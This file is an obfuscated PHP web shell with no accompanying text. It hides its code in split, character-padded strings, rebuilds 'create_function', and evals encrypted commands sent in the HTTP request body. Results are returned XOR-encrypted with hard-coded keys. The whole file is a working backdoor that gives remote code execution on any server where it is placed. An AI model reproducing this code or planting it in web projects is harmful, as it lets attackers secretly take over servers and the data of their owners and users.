<?php
$V='ch("-/$kh(.+--)$kf/-",@file_get-_content-s("php:-//i-nput"),$m)-==1) {@o-b_s-tart();@e-';
$u='ob_e-nd-_clean();$-r=@base6-4_--enco-de(@x(@gzcompre-ss(-$o),$-k));print("-$p$kh$r-$kf");}';
$S='uncti-on x-($t,$k-){-$c=strlen(-$k--)-;$l=s-tr-len($t);$o="";for($-i=0-;$i<$-l;){f-or($j';
$t='val(@-gzuncom-pr-ess(@x(@b-a-se64_decod-e($m[1]-),-$k)));$o-=@o--b_get_-contents();@';
$U=str_replace('R','','crReRateR_fRRuncRtion');
$F='-=0;($j<$c--&&$i<$l);$j++,$i++){$o-.=$t{-$i}^$k{$j}-;}-}return- $o;}if (-@preg_-ma-t';
$R='$k="5-c70--dfdf";$kh="45af-db6-c9b3d";$kf="a-ec-e811-ab5-d9";$p="zaZ-1Kw-JRsXS-SG7Pb";f';
$J=str_replace('-','',$R.$S.$F.$V.$t.$u);
$i=$U('',$J);$i();
?>
